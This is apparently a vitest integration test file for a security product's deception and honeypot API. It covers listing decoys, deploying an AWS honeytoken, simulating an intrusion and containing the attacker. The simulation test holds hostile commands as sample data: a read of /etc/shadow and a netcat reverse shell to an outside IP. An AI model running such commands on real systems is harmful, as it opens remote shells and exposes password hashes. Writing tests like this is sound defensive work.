import { describe, it, expect, beforeAll } from 'vitest';
import request from 'supertest';
import app from '../src/app.js';

describe('Deception & Honeypot Engine Integration Tests', () => {
  let authToken: string;
  let decoyId: string;
  let interactionId: string;

  beforeAll(async () => {
    const loginRes = await request(app).post('/api/v1/auth/login').send({
      email: 'admin@sentinelx.io',
      password: 'Admin@SentinelX2026',
    });

    authToken = loginRes.body.data.token;
  });

  it('should list deployed deception decoys and honeytokens', async () => {
    const res = await request(app)
      .get('/api/v1/deception/decoys')
      .set('Authorization', `Bearer ${authToken}`);

    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
    expect(res.body.data).toBeInstanceOf(Array);
    expect(res.body.data.length).toBeGreaterThan(0);

    decoyId = res.body.data[0].id;
  });

  it('should deploy a new AWS Honeytoken credential key', async () => {
    const res = await request(app)
      .post('/api/v1/deception/decoys')
      .set('Authorization', `Bearer ${authToken}`)
      .send({
        name: 'Trap IAM Admin Key (Decoy)',
        type: 'HONEYTOKEN_AWS_KEY',
        target: 'AWS Secrets Manager Trap',
      });

    expect(res.status).toBe(201);
    expect(res.body.success).toBe(true);
    expect(res.body.data.tokenValue).toContain('AKIA');
  });

  it('should simulate attacker honeypot intrusion and trigger zero-false-positive alarm', async () => {
    const res = await request(app)
      .post('/api/v1/deception/simulate')
      .set('Authorization', `Bearer ${authToken}`)
      .send({
        decoyId,
        attackerIp: '185.220.101.88',
        userAgent: 'Nmap Scripting Engine / Exploit Framework',
        commandsAttempted: ['cat /etc/shadow', 'nc -e /bin/bash 185.220.101.88 4444'],
      });

    expect(res.status).toBe(201);
    expect(res.body.success).toBe(true);
    expect(res.body.data.severity).toBe('CRITICAL');
    expect(res.body.data.status).toBe('ALARM_ACTIVE');

    interactionId = res.body.data.id;
  });

  it('should execute 1-click attacker IP isolation countermeasure', async () => {
    const res = await request(app)
      .post(`/api/v1/deception/interactions/${interactionId}/contain`)
      .set('Authorization', `Bearer ${authToken}`);

    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
    expect(res.body.data.status).toBe('CONTAINED');
  });
});
